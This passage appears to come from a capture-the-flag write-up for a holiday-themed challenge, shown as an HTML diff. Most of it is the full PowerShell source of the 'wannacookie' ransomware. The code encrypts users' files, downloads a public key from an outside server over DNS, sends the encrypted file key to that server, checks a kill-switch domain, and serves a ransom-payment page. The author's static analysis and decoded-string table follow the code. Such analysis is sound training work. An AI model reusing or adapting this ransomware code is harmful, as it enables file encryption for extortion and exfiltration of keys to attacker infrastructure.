+            <span class="nv">$cont</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="p">=</span> <span class="nv">$b1</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">-bxor</span> <span class="nv">$b2</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span>
+        <span class="p">}</span>   
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nv">$cont</span>
+<span class="p">}</span>
+<span class="k">function</span> <span class="n">B2G</span> <span class="p">{</span>
+    <span class="k">param</span><span class="p">(</span><span class="no">[byte[]]</span><span class="nv">$Data</span><span class="p">)</span>
+    <span class="k">Process</span> <span class="p">{</span>
+    <span class="nv">$out</span> <span class="p">=</span> <span class="no">[System.IO.MemoryStream]</span><span class="p">::</span><span class="n">new</span><span class="p">()</span>
+    <span class="nv">$gStream</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">Compression</span><span class="p">.</span><span class="n">GzipStream</span> <span class="nv">$out</span><span class="p">,</span> <span class="p">(</span><span class="no">[IO.Compression.CompressionMode]</span><span class="p">::</span><span class="n">Compress</span><span class="p">)</span>
+
+      <span class="nv">$gStream</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="nv">$Data</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="nv">$Data</span><span class="p">.</span><span class="n">Length</span><span class="p">)</span>
+      <span class="nv">$gStream</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>
+    <span class="k">return</span> <span class="nv">$out</span><span class="p">.</span><span class="n">ToArray</span><span class="p">()</span>
+  <span class="p">}</span>
+
+<span class="p">}</span>
+<span class="k">function</span> <span class="n">G2B</span> <span class="p">{</span>
+<span class="k">param</span><span class="p">(</span><span class="no">[byte[]]</span><span class="nv">$Data</span><span class="p">)</span>
+    <span class="k">Process</span> <span class="p">{</span>
+        <span class="nv">$SrcData</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">MemoryStream</span><span class="p">(</span> <span class="p">,</span> <span class="nv">$Data</span> <span class="p">)</span>
+        <span class="nv">$output</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">MemoryStream</span>
+        <span class="nv">$gStream</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">Compression</span><span class="p">.</span><span class="n">GzipStream</span> <span class="nv">$SrcData</span><span class="p">,</span> <span class="p">(</span><span class="no">[IO.Compression.CompressionMode]</span><span class="p">::</span><span class="n">Decompress</span><span class="p">)</span>
+        <span class="nv">$gStream</span><span class="p">.</span><span class="n">CopyTo</span><span class="p">(</span> <span class="nv">$output</span> <span class="p">)</span>
+        <span class="nv">$gStream</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>
+        <span class="nv">$SrcData</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>
+        <span class="no">[byte[]]</span> <span class="nv">$byteArr</span> <span class="p">=</span> <span class="nv">$output</span><span class="p">.</span><span class="n">ToArray</span><span class="p">()</span>
+        <span class="k">return</span> <span class="nv">$byteArr</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="k">function</span> <span class="n">Sha1</span><span class="p">(</span><span class="no">[String]</span> <span class="nv">$String</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$SB</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Text</span><span class="p">.</span><span class="n">StringBuilder</span>
+        <span class="no">[System.Security.Cryptography.HashAlgorithm]</span><span class="p">::</span><span class="n">Create</span><span class="p">(</span><span class="s2">&quot;SHA1&quot;</span><span class="p">).</span><span class="n">ComputeHash</span><span class="p">(</span><span class="no">[System.Text.Encoding]</span><span class="p">::</span><span class="n">UTF8</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="nv">$String</span><span class="p">))|%{</span>
+        <span class="no">[Void]</span><span class="nv">$SB</span><span class="p">.</span><span class="n">Append</span><span class="p">(</span><span class="nv">$_</span><span class="p">.</span><span class="n">ToString</span><span class="p">(</span><span class="s2">&quot;x2&quot;</span><span class="p">))</span>
+    <span class="p">}</span>
+    <span class="nv">$SB</span><span class="p">.</span><span class="n">ToString</span><span class="p">()</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="n">Pub_Key_Enc</span><span class="p">(</span><span class="nv">$key_bytes</span><span class="p">,</span> <span class="no">[byte[]]</span><span class="nv">$pub_bytes</span><span class="p">){</span>
+     <span class="nv">$cert</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">-TypeName</span> <span class="n">System</span><span class="p">.</span><span class="n">Security</span><span class="p">.</span><span class="n">Cryptography</span><span class="p">.</span><span class="n">X509Certificates</span><span class="p">.</span><span class="n">X509Certificate2</span>
+     <span class="nv">$cert</span><span class="p">.</span><span class="n">Import</span><span class="p">(</span><span class="nv">$pub_bytes</span><span class="p">)</span>
+     <span class="nv">$encKey</span> <span class="p">=</span> <span class="nv">$cert</span><span class="p">.</span><span class="n">PublicKey</span><span class="p">.</span><span class="n">Key</span><span class="p">.</span><span class="n">Encrypt</span><span class="p">(</span><span class="nv">$key_bytes</span><span class="p">,</span> <span class="nv">$true</span><span class="p">)</span>
+     <span class="k">return</span> <span class="p">$(</span><span class="n">B2H</span> <span class="nv">$encKey</span><span class="p">)</span>
+<span class="p">}</span>
+<span class="k">function</span> <span class="n">enc_dec</span> <span class="p">{</span>
+    <span class="k">param</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="nv">$allfiles</span><span class="p">,</span> <span class="nv">$make_cookie</span> <span class="p">)</span>
+    <span class="nv">$tcount</span> <span class="p">=</span> <span class="n">12</span>
+    <span class="k">for</span> <span class="p">(</span> <span class="nv">$file</span><span class="p">=</span><span class="n">0</span><span class="p">;</span> <span class="nv">$file</span> <span class="o">-lt</span> <span class="nv">$allfiles</span><span class="p">.</span><span class="n">length</span><span class="p">;</span> <span class="nv">$file</span><span class="p">++</span>  <span class="p">)</span> <span class="p">{</span>
+        <span class="k">while</span> <span class="p">(</span><span class="nv">$true</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$running</span> <span class="p">=</span> <span class="p">@(</span><span class="nb">Get-Job</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span> <span class="nv">$_</span><span class="p">.</span><span class="n">State</span> <span class="o">-eq</span> <span class="s1">&#39;Running&#39;</span> <span class="p">})</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nv">$running</span><span class="p">.</span><span class="n">Count</span> <span class="o">-le</span> <span class="nv">$tcount</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nb">Start-Job</span>  <span class="n">-ScriptBlock</span> <span class="p">{</span>
+                    <span class="k">param</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="nv">$File</span><span class="p">,</span> <span class="nv">$true_false</span><span class="p">)</span>
+                    <span class="k">try</span><span class="p">{</span>
+                        <span class="n">Enc_Dec</span><span class="o">-File</span> <span class="nv">$key</span> <span class="nv">$File</span> <span class="nv">$true_false</span>
+                    <span class="p">}</span> <span class="k">catch</span> <span class="p">{</span>
+                        <span class="nv">$_</span><span class="p">.</span><span class="n">Exception</span><span class="p">.</span><span class="n">Message</span> <span class="p">|</span> <span class="nb">Out-String</span> <span class="p">|</span> <span class="nb">Out-File</span> <span class="p">$(</span><span class="nv">$env:userprofile</span><span class="p">+</span><span class="s1">&#39;\Desktop\ps_log.txt&#39;</span><span class="p">)</span> <span class="n">-append</span>
+                    <span class="p">}</span>
+                <span class="p">}</span> <span class="n">-args</span> <span class="nv">$key</span><span class="p">,</span> <span class="nv">$allfiles</span><span class="p">[</span><span class="nv">$file</span><span class="p">],</span> <span class="nv">$make_cookie</span> <span class="n">-InitializationScript</span> <span class="nv">$functions</span>
+                <span class="k">break</span>
+            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                <span class="nb">Start-Sleep</span> <span class="n">-m</span> <span class="n">200</span>
+                <span class="k">continue</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="n">get_over_dns</span><span class="p">(</span><span class="nv">$f</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$h</span> <span class="p">=</span> <span class="s1">&#39;&#39;</span>
+    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$i</span> <span class="k">in</span> <span class="n">0</span><span class="p">..(</span><span class="no">[convert]</span><span class="p">::</span><span class="n">ToInt32</span><span class="p">($(</span><span class="nb">Resolve-DnsName</span> <span class="n">-Server</span> <span class="n">erohetfanu</span><span class="p">.</span><span class="n">com</span> <span class="n">-Name</span> <span class="s2">&quot;$f.erohetfanu.com&quot;</span> <span class="n">-Type</span> <span class="n">TXT</span><span class="p">).</span><span class="n">Strings</span><span class="p">,</span> <span class="n">10</span><span class="p">)-</span><span class="n">1</span><span class="p">))</span> <span class="p">{</span>
+        <span class="nv">$h</span> <span class="p">+=</span> <span class="p">$(</span><span class="nb">Resolve-DnsName</span> <span class="n">-Server</span> <span class="n">erohetfanu</span><span class="p">.</span><span class="n">com</span> <span class="n">-Name</span> <span class="s2">&quot;$i.$f.erohetfanu.com&quot;</span> <span class="n">-Type</span> <span class="n">TXT</span><span class="p">).</span><span class="n">Strings</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="p">(</span><span class="n">H2A</span> <span class="nv">$h</span><span class="p">)</span>
+<span class="p">}</span>
+<span class="k">function</span> <span class="n">split_to_chunks</span><span class="p">(</span><span class="nv">$astring</span><span class="p">,</span> <span class="nv">$size</span><span class="p">=</span><span class="n">32</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$new_arr</span> <span class="p">=</span> <span class="p">@()</span>
+    <span class="nv">$chunk_index</span><span class="p">=</span><span class="n">0</span>
+    <span class="k">foreach</span><span class="p">(</span><span class="nv">$i</span> <span class="k">in</span> <span class="n">1</span><span class="p">..$(</span><span class="nv">$astring</span><span class="p">.</span><span class="n">length</span> <span class="p">/</span> <span class="nv">$size</span><span class="p">))</span> <span class="p">{</span>
+        <span class="nv">$new_arr</span> <span class="p">+=</span> <span class="p">@(</span><span class="nv">$astring</span><span class="p">.</span><span class="n">substring</span><span class="p">(</span><span class="nv">$chunk_index</span><span class="p">,</span><span class="nv">$size</span><span class="p">))</span>
+        <span class="nv">$chunk_index</span> <span class="p">+=</span> <span class="nv">$size</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nv">$new_arr</span>
+<span class="p">}</span>
+<span class="k">function</span> <span class="n">send_key</span><span class="p">(</span><span class="nv">$encrypted_key</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$chunks</span> <span class="p">=</span> <span class="p">(</span><span class="n">split_to_chunks</span> <span class="nv">$encrypted_key</span> <span class="p">)</span>
+    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$j</span> <span class="k">in</span> <span class="nv">$chunks</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$chunks</span><span class="p">.</span><span class="n">IndexOf</span><span class="p">(</span><span class="nv">$j</span><span class="p">)</span> <span class="o">-eq</span> <span class="n">0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$new_cookie</span> <span class="p">=</span> <span class="p">$(</span><span class="nb">Resolve-DnsName</span> <span class="n">-Server</span> <span class="n">erohetfanu</span><span class="p">.</span><span class="n">com</span> <span class="n">-Name</span> <span class="s2">&quot;$j.6B6579666F72626F746964.erohetfanu.com&quot;</span> <span class="n">-Type</span> <span class="n">TXT</span><span class="p">).</span><span class="n">Strings</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="p">$(</span><span class="nb">Resolve-DnsName</span> <span class="n">-Server</span> <span class="n">erohetfanu</span><span class="p">.</span><span class="n">com</span> <span class="n">-Name</span> <span class="s2">&quot;$new_cookie.$j.6B6579666F72626F746964.erohetfanu.com&quot;</span> <span class="n">-Type</span> <span class="n">TXT</span><span class="p">).</span><span class="n">Strings</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nv">$new_cookie</span>
+<span class="p">}</span>
+<span class="k">function</span> <span class="n">wannacookie</span> <span class="p">{</span>
+    <span class="nv">$S1</span> <span class="p">=</span> <span class="s2">&quot;1f8b080000000000040093e76762129765e2e1e6640f6361e7e202000cdd5c5c10000000&quot;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$null</span> <span class="o">-ne</span> <span class="p">((</span><span class="nb">Resolve-DnsName</span> <span class="n">-Name</span> <span class="p">$(</span><span class="n">H2A</span> <span class="p">$(</span><span class="n">B2H</span> <span class="p">$(</span><span class="n">ti_rox</span> <span class="p">$(</span><span class="n">B2H</span> <span class="p">$(</span><span class="n">G2B</span> <span class="p">$(</span><span class="n">H2B</span> <span class="nv">$S1</span><span class="p">)))</span> <span class="p">$(</span><span class="nb">Resolve-DnsName</span> <span class="n">-Server</span> <span class="n">erohetfanu</span><span class="p">.</span><span class="n">com</span> <span class="n">-Name</span> <span class="n">6B696C6C737769746368</span><span class="p">.</span><span class="n">erohetfanu</span><span class="p">.</span><span class="n">com</span> <span class="n">-Type</span> <span class="n">TXT</span><span class="p">).</span><span class="n">Strings</span><span class="p">))).</span><span class="n">ToString</span><span class="p">()</span> <span class="n">-ErrorAction</span> <span class="n">0</span> <span class="n">-Server</span> <span class="n">8</span><span class="p">.</span><span class="n">8</span><span class="p">.</span><span class="n">8</span><span class="p">.</span><span class="n">8</span><span class="p">)))</span> <span class="p">{</span><span class="k">return</span><span class="p">}</span> 
+    <span class="k">if</span> <span class="p">($(</span><span class="n">netstat</span> <span class="n">-ano</span> <span class="p">|</span> <span class="nb">Select-String</span> <span class="s2">&quot;127.0.0.1:8080&quot;</span><span class="p">).</span><span class="n">length</span> <span class="o">-ne</span> <span class="n">0</span> <span class="o">-or</span> <span class="p">(</span><span class="nb">Get-WmiObject</span> <span class="n">Win32_ComputerSystem</span><span class="p">).</span><span class="n">Domain</span> <span class="o">-ne</span> <span class="s2">&quot;KRINGLECASTLE&quot;</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span><span class="p">}</span>
+    <span class="nv">$pub_key</span> <span class="p">=</span> <span class="no">[System.Convert]</span><span class="p">::</span><span class="n">FromBase64String</span><span class="p">($(</span><span class="n">get_over_dns</span><span class="p">(</span><span class="s2">&quot;7365727665722E637274&quot;</span><span class="p">)</span> <span class="p">)</span> <span class="p">)</span>
+    <span class="nv">$Byte_key</span> <span class="p">=</span> <span class="p">(</span><span class="no">[System.Text.Encoding]</span><span class="p">::</span><span class="n">Unicode</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">($((</span><span class="no">[char[]]</span><span class="p">(</span><span class="no">[char]01..[char]</span><span class="n">255</span><span class="p">)</span> <span class="p">+</span> <span class="p">(</span><span class="no">[char[]]</span><span class="p">(</span><span class="no">[char]01..[char]</span><span class="n">255</span><span class="p">))</span> <span class="p">+</span> <span class="n">0</span><span class="p">..</span><span class="n">9</span> <span class="p">|</span> <span class="nb">sort </span><span class="p">{</span><span class="nb">Get-Random</span><span class="p">})[</span><span class="n">0</span><span class="p">..</span><span class="n">15</span><span class="p">]</span> <span class="n">-join</span> <span class="s1">&#39;&#39;</span><span class="p">))</span>  <span class="p">|</span> <span class="p">?</span> <span class="p">{</span><span class="nv">$_</span> <span class="o">-ne</span> <span class="n">0x00</span><span class="p">})</span>
+    <span class="nv">$Hex_key</span> <span class="p">=</span> <span class="p">$(</span><span class="n">B2H</span> <span class="nv">$Byte_key</span><span class="p">)</span>
+    <span class="nv">$Key_Hash</span> <span class="p">=</span> <span class="p">$(</span><span class="n">Sha1</span> <span class="nv">$Hex_key</span><span class="p">)</span>
+    <span class="nv">$Pub_key_encrypted_Key</span> <span class="p">=</span> <span class="p">(</span><span class="n">Pub_Key_Enc</span> <span class="nv">$Byte_key</span> <span class="nv">$pub_key</span><span class="p">).</span><span class="n">ToString</span><span class="p">()</span>
+    <span class="nv">$cookie_id</span> <span class="p">=</span> <span class="p">(</span><span class="n">send_key</span> <span class="nv">$Pub_key_encrypted_Key</span><span class="p">)</span>
+    <span class="nv">$date_time</span> <span class="p">=</span> <span class="p">(($(</span><span class="nb">Get-Date</span><span class="p">).</span><span class="n">ToUniversalTime</span><span class="p">()</span> <span class="p">|</span> <span class="nb">Out-String</span><span class="p">)</span> <span class="o">-replace</span> <span class="s2">&quot;</span><span class="se">`r`n</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="no">[array]</span><span class="nv">$future_cookies</span> <span class="p">=</span> <span class="p">$(</span><span class="nb">Get-ChildItem</span> <span class="p">*.</span><span class="n">elfdb</span> <span class="n">-Exclude</span> <span class="p">*.</span><span class="n">wannacookie</span> <span class="n">-Path</span> <span class="p">$($(</span><span class="nv">$env:userprofile</span><span class="p">+</span><span class="s1">&#39;\Desktop&#39;</span><span class="p">),$(</span><span class="nv">$env:userprofile</span><span class="p">+</span><span class="s1">&#39;\Documents&#39;</span><span class="p">),$(</span><span class="nv">$env:userprofile</span><span class="p">+</span><span class="s1">&#39;\Videos&#39;</span><span class="p">),$(</span><span class="nv">$env:userprofile</span><span class="p">+</span><span class="s1">&#39;\Pictures&#39;</span><span class="p">),$(</span><span class="nv">$env:userprofile</span><span class="p">+</span><span class="s1">&#39;\Music&#39;</span><span class="p">))</span> <span class="n">-Recurse</span> <span class="p">|</span> <span class="nb">where </span><span class="p">{</span> <span class="p">!</span> <span class="nv">$_</span><span class="p">.</span><span class="n">PSIsContainer</span> <span class="p">}</span> <span class="p">|</span> <span class="k">Foreach</span><span class="n">-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">Fullname</span><span class="p">})</span>
+    <span class="n">enc_dec</span> <span class="nv">$Byte_key</span> <span class="nv">$future_cookies</span> <span class="nv">$true</span>
+    <span class="nb">Clear-variable</span> <span class="n">-Name</span> <span class="s2">&quot;Hex_key&quot;</span>
+    <span class="nb">Clear-variable</span> <span class="n">-Name</span> <span class="s2">&quot;Byte_key&quot;</span>
+    <span class="nv">$lurl</span> <span class="p">=</span> <span class="s1">&#39;http://127.0.0.1:8080/&#39;</span>
+    <span class="nv">$htmlcontents</span> <span class="p">=</span> <span class="p">@{</span>
+        <span class="s1">&#39;GET /&#39;</span>  <span class="p">=</span>  <span class="p">$(</span><span class="n">get_over_dns</span> <span class="p">(</span><span class="n">A2H</span> <span class="s2">&quot;source.min.html&quot;</span><span class="p">))</span>
+        <span class="s1">&#39;GET /close&#39;</span>  <span class="p">=</span>  <span class="s1">&#39;&lt;p&gt;Bye!&lt;/p&gt;&#39;</span>
+    <span class="p">}</span>
+    <span class="nb">Start-Job</span> <span class="n">-ScriptBlock</span><span class="p">{</span>
+        <span class="k">param</span><span class="p">(</span><span class="nv">$url</span><span class="p">)</span>
+            <span class="nb">Start-Sleep</span> <span class="n">10</span>
+            <span class="nb">Add-type</span> <span class="n">-AssemblyName</span> <span class="n">System</span><span class="p">.</span><span class="n">Windows</span><span class="p">.</span><span class="n">Forms</span>
+            <span class="nb">start-process</span> <span class="s2">&quot;$url&quot;</span> <span class="n">-WindowStyle</span> <span class="n">Maximized</span>
+            <span class="nb">Start-sleep</span> <span class="n">2</span>
+            <span class="no">[System.Windows.Forms.SendKeys]</span><span class="p">::</span><span class="n">SendWait</span><span class="p">(</span><span class="s2">&quot;{F11}&quot;</span><span class="p">)</span>
+    <span class="p">}</span> <span class="n">-Arg</span> <span class="nv">$lurl</span>
+    <span class="nv">$listener</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">HttpListener</span>
+    <span class="nv">$listener</span><span class="p">.</span><span class="n">Prefixes</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="nv">$lurl</span><span class="p">)</span>
+    <span class="nv">$listener</span><span class="p">.</span><span class="n">Start</span><span class="p">()</span>
+    <span class="k">try</span> <span class="p">{</span>
+        <span class="nv">$close</span> <span class="p">=</span> <span class="nv">$false</span>
+        <span class="k">while</span> <span class="p">(</span><span class="nv">$listener</span><span class="p">.</span><span class="n">IsListening</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$context</span> <span class="p">=</span> <span class="nv">$listener</span><span class="p">.</span><span class="n">GetContext</span><span class="p">()</span>
+            <span class="nv">$Req</span> <span class="p">=</span> <span class="nv">$context</span><span class="p">.</span><span class="n">Request</span>
+            <span class="nv">$Resp</span> <span class="p">=</span> <span class="nv">$context</span><span class="p">.</span><span class="n">Response</span>
+            <span class="nv">$Resp</span><span class="p">.</span><span class="n">Headers</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="s2">&quot;Access-Control-Allow-Origin&quot;</span><span class="p">,</span><span class="s2">&quot;*&quot;</span><span class="p">)</span>
+            <span class="nv">$received</span> <span class="p">=</span> <span class="s1">&#39;{0} {1}&#39;</span> <span class="o">-f</span> <span class="nv">$Req</span><span class="p">.</span><span class="n">httpmethod</span><span class="p">,</span> <span class="nv">$Req</span><span class="p">.</span><span class="n">url</span><span class="p">.</span><span class="n">localpath</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nv">$received</span> <span class="o">-eq</span> <span class="s1">&#39;GET /&#39;</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nv">$html</span> <span class="p">=</span> <span class="nv">$htmlcontents</span><span class="p">[</span><span class="nv">$received</span><span class="p">]</span>
+            <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$received</span> <span class="o">-eq</span> <span class="s1">&#39;GET /decrypt&#39;</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nv">$akey</span> <span class="p">=</span> <span class="nv">$Req</span><span class="p">.</span><span class="n">QueryString</span><span class="p">.</span><span class="n">Item</span><span class="p">(</span><span class="s2">&quot;key&quot;</span><span class="p">)</span>
+                <span class="k">if</span> <span class="p">(</span><span class="nv">$Key_Hash</span> <span class="o">-eq</span> <span class="p">$(</span><span class="n">Sha1</span> <span class="nv">$akey</span><span class="p">))</span> <span class="p">{</span>
+                    <span class="nv">$akey</span> <span class="p">=</span> <span class="p">$(</span><span class="n">H2B</span> <span class="nv">$akey</span><span class="p">)</span>
+                    <span class="no">[array]</span><span class="nv">$allcookies</span> <span class="p">=</span> <span class="p">$(</span><span class="nb">Get-ChildItem</span> <span class="n">-Path</span> <span class="p">$(</span><span class="nv">$env:userprofile</span><span class="p">)</span> <span class="n">-Recurse</span>  <span class="n">-Filter</span> <span class="p">*.</span><span class="n">wannacookie</span> <span class="p">|</span> <span class="nb">where </span><span class="p">{</span> <span class="p">!</span> <span class="nv">$_</span><span class="p">.</span><span class="n">PSIsContainer</span> <span class="p">}</span> <span class="p">|</span> <span class="k">Foreach</span><span class="n">-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">Fullname</span><span class="p">})</span>
+                    <span class="n">enc_dec</span> <span class="nv">$akey</span> <span class="nv">$allcookies</span> <span class="nv">$false</span>
+                    <span class="nv">$html</span> <span class="p">=</span> <span class="s2">&quot;Files have been decrypted!&quot;</span>
+                    <span class="nv">$close</span> <span class="p">=</span> <span class="nv">$true</span>
+                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                    <span class="nv">$html</span> <span class="p">=</span> <span class="s2">&quot;Invalid Key!&quot;</span>
+                <span class="p">}</span>
+            <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$received</span> <span class="o">-eq</span> <span class="s1">&#39;GET /close&#39;</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nv">$close</span> <span class="p">=</span> <span class="nv">$true</span>
+                <span class="nv">$html</span> <span class="p">=</span> <span class="nv">$htmlcontents</span><span class="p">[</span><span class="nv">$received</span><span class="p">]</span>
+            <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$received</span> <span class="o">-eq</span> <span class="s1">&#39;GET /cookie_is_paid&#39;</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nv">$cookie_and_key</span> <span class="p">=</span> <span class="p">$(</span><span class="nb">Resolve-DnsName</span> <span class="n">-Server</span> <span class="n">erohetfanu</span><span class="p">.</span><span class="n">com</span> <span class="n">-Name</span> <span class="p">(</span><span class="s2">&quot;$cookie_id.72616e736f6d697370616964.erohetfanu.com&quot;</span><span class="p">.</span><span class="n">trim</span><span class="p">())</span> <span class="n">-Type</span> <span class="n">TXT</span><span class="p">).</span><span class="n">Strings</span>
+                <span class="k">if</span> <span class="p">(</span> <span class="nv">$cookie_and_key</span><span class="p">.</span><span class="n">length</span> <span class="o">-eq</span> <span class="n">32</span> <span class="p">)</span> <span class="p">{</span>
+                    <span class="nv">$html</span> <span class="p">=</span> <span class="nv">$cookie_and_key</span>
+                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                    <span class="nv">$html</span> <span class="p">=</span> <span class="s2">&quot;UNPAID|$cookie_id|$date_time&quot;</span>
+                <span class="p">}</span>
+            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                <span class="nv">$Resp</span><span class="p">.</span><span class="n">statuscode</span> <span class="p">=</span> <span class="n">404</span>
+                <span class="nv">$html</span> <span class="p">=</span> <span class="s1">&#39;&lt;h1&gt;404 Not Found&lt;/h1&gt;&#39;</span>
+            <span class="p">}</span>
+            <span class="nv">$buffer</span> <span class="p">=</span> <span class="no">[Text.Encoding]</span><span class="p">::</span><span class="n">UTF8</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="nv">$html</span><span class="p">)</span>
+            <span class="nv">$Resp</span><span class="p">.</span><span class="n">ContentLength64</span> <span class="p">=</span> <span class="nv">$buffer</span><span class="p">.</span><span class="n">length</span>
+            <span class="nv">$Resp</span><span class="p">.</span><span class="n">OutputStream</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="nv">$buffer</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="nv">$buffer</span><span class="p">.</span><span class="n">length</span><span class="p">)</span>
+            <span class="nv">$Resp</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nv">$close</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nv">$listener</span><span class="p">.</span><span class="n">Stop</span><span class="p">()</span>
+                <span class="k">return</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">}</span> <span class="k">finally</span> <span class="p">{</span>
+        <span class="nv">$listener</span><span class="p">.</span><span class="n">Stop</span><span class="p">()</span>
+    <span class="p">}</span>    
+<span class="p">}</span>
+<span class="n">wannacookie</span>
+</pre></div>
+
+
+<p>A static analysis of the code reveals the following functionality (30,000 ft view):</p>
+<ol>
+<li>Perform a DNS query, and if it returns a result, stop running</li>
+<li>Check to make sure we're executing in the KRINGLECASTLE domain, otherwise stop running</li>
+<li>Download the public key from the malware server over DNS</li>
+<li>Generate a random key to encrypt files with</li>
+<li>Encrypt the file encryption key with the public key in the certificate</li>
+<li>Send the encrypted file encryption key to the server</li>
+<li>Fetch a list of files ending in .elfdb in the user's home directory</li>
+<li>Encrypt any matching files</li>
+<li>Clear the unencrypted file encryption key from memory</li>
+<li>Open a web listener to handle additional functions like displaying the ransom demands, and checking whether the ransom has been paid</li>
+</ol>
+<p>We also notice some additional hex encoded strings.  Here's a summary of all the strings we've encountered so far:</p>
+<table>
+<thead>
+<tr>
+<th>hex-encoded text</th>
+<th>text</th>
+<th>purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>7365727665722E637274</td>
+<td>server.crt</td>
+<td>Download malware public certificate</td>
+</tr>
+<tr>
+<td>77616E6E61636F6F6B69652E6D696E2E707331</td>
+<td>wannacookie.min.ps1</td>
+<td>Download minified ransomware</td>
+</tr>
+<tr>
+<td>77616E6E61636F6F6B69652E707331</td>
+<td>wannacookie.ps1</td>
+<td>Download unminified ransomware</td>
+</tr>
+<tr>
+<td>6B696C6C737769746368</td>
+<td>killswitch</td>
+<td>Check if killswitch should be activated</td>
+</tr>
+<tr>
+<td>6B6579666F72626F746964</td>
+<td>keyforbotid</td>
+<td>Transmit encryption key to the server</td>
+</tr>
+<tr>
+<td>72616e736f6d697370616964</td>
+<td>ransomispaid</td>
+<td>Check server for status of ransom payment</td>
+</tr>
+</tbody>
+</table>
+<p>The kill switch is what we're after in this step, but the hostname name that triggers it (stored in $S1) is obfuscated in multiple layers of encoding.  There are a couple ways we could approach this without some serious reverse-engineering: 1) allow the code to run in a test environment while running a packet capture and see what's in the DNS request, or 2) let the malware do the heavy lifting for us!  If we load wannacookie.ps1 into a Powershell ISE, which comes with Windows 10, we can use the debugger to control the flow of the program and run just the parts we want.</p>
+<p>We need the program to run as far as setting the $S1 variable, and then we'll take it from there.  Load the script and add a breakpoint on the line that contains the killswitch step.  </p>
